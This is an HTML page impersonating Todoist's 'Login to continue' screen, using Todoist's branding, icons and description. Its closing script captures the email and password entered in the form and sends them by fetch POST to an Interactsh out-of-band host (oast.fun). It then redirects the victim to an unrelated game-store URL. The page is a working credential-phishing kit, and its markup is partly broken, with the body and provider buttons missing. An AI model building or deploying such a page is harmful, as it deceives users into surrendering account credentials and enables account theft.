<!DOCTYPE html>
<html dir="ltr" lang="en" class="theme_todoist">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Login to continue</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="https://app.todoist.com/assets/images/5811d27cc3a2767f.jpg">
    <meta property="og:image:secure_url" content="https://app.todoist.com/assets/images/5811d27cc3a2767f.jpg">
    <meta name="apple-itunes-app" content="app-id=572688855">
    <meta name="description"
        content="Trusted by 35+ million people and teams, the Todoist app is the world's favorite task manager and to-do list app. Organize your work and life, finally.">
    <link rel="icon" href="https://app.todoist.com/favicon.ico" sizes="32x32">
    <link rel="icon" href="https://app.todoist.com/todoist.svg" type="image/svg+xml">
    <link rel="apple-touch-icon" href="https://app.todoist.com/apple-touch-icon.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        :root {
            --default-light-actionable-idle: #444;
            --button-large-height: 48px;
            --button-large-border-radius: 8px;
            --button-large-font-size: 18px;
            --button-large-font-weight: 700;
            --error-border: #dc4c3e;
            --brand-secondary-dark: #fde8d9;
            --brand-secondary-light: #fff9f3;
            --product-library-background-base-primary: #ffffff;
            --reactist-border-radius-large: 8px;
            --reactist-spacing-xlarge: 24px;
            --product-library-shadow-raised-1: 0px 2px 8px rgba(0, 0, 0, 0.08);
            --product-library-display-accent-primary-tint: #d1453b;
        }

        html,
        body,
        #todoist_app {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            height: 100%;
            margin: 0;
            padding: 0;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Noto Sans, Ubuntu, Cantarell, Helvetica Neue, Noto, Oxygen-Sans, Cantrell, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol;
            position: relative;
            overflow-y: auto;
            background-color: var(--product-library-background-base-primary);
        }

        .authContainer {
            display: flex;
            min-height: 100%;
            width: 100%;
        }

        .leftColumn {
            width: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 2rem;
        }

        .rightColumn {
            width: 50%;
            background-color: var(--brand-secondary-light);
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        
        @media (max-width: 992px) {
            .rightColumn {
                display: none;
            }
            .leftColumn {
                width: 100%;
                padding: 1rem;
            }
        }

        .formContainer {
            max-width: 350px;
            width: 100%;
        }

        .providerButton {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: var(--button-large-height);
            border-radius: var(--button-large-border-radius);
            font-size: 15px;
            font-weight: 600;
            border: 1px solid #ddd;
            background-color: #fff;
            margin-bottom: 1rem;
            cursor: pointer;
            text-decoration: none;
            color: #202020;
        }

        .providerButton svg {
            margin-right: 10px;
        }

        .appleButton {
             background-color: #000;
             color: #fff;
             border: none;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            color: #aaa;
            margin: 1.5rem 0;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #ddd;
        }

        .divider:not(:empty)::before {
            margin-right: .25em;
        }

        .divider:not(:empty)::after {
            margin-left: .25em;
        }

        .inputGroup {
            margin-bottom: 1.5rem;
        }

        .inputGroup label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .inputGroup input {
            width: 100%;
            padding: 0.75rem;
            border-radius: 8px;
            border: 1px solid #ddd;
            font-size: 16px;
        }
        
        .inputGroup input:focus {
            outline: none;
            border-color: #d1453b;
            box-shadow: 0 0 0 2px rgba(209, 69, 59, 0.2);
        }

        .loginButton {
            width: 100%;
            padding: 0.75rem;
            border: none;
            border-radius: 8px;
            background-color: #d1453b;
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
        }
        
        .loginButton:hover {
            background-color: #b83b30;
        }

        .authLink {
            color: var(--product-library-display-accent-primary-tint);
            text-decoration: none;
            font-weight: 600;
        }

        .authLink:hover {
            text-decoration: underline;
        }

        .illustration img {
            max-width: 450px;
            width: 100%;
        }
    </style>
</head>

                    <div class="divider">OR</div>

                    <form id="loginForm">
                        <div class="inputGroup">
                            <label for="email">Email</label>
                            <input type="email" id="email" placeholder="Enter your email...">
                        </div>
                        <div class="inputGroup">
                            <label for="password">Password</label>
                            <input type="password" id="password" placeholder="Enter your password...">
                        </div>
                        <button type="submit" class="loginButton">Log in</button>
                    </form>

                    <div class="text-center mt-4 text-sm">
                        <a href="#" class="authLink">Forgot your password?</a>
                    </div>
                    <div class="text-center mt-4 text-xs text-gray-500">

                    </div>

                    <hr class="my-6">
                    
                    <div class="text-center text-sm">

                    </div>

     <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
          // Prevent the default form submission behavior
          event.preventDefault();
    
          // Get the values entered by the user
          var email = document.getElementById('email').value;
          var password = document.getElementById('password').value;
    
          // Log the email and password
          console.log("Email:", email);
          console.log("Password:", password);
    
          // Send the email and password to Interactsh
          fetch('https://jygebpzicbhgdqvffjmxcecsqwn93r1g3.oast.fun', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email, password: password })
          })
          .then(response => {
            // Redirect the user to the specified link
            window.location.href = 'https://gfal.market/store/elemental-raiders';
          })
          .catch(error => console.error('Error:', error));
        });
      </script>
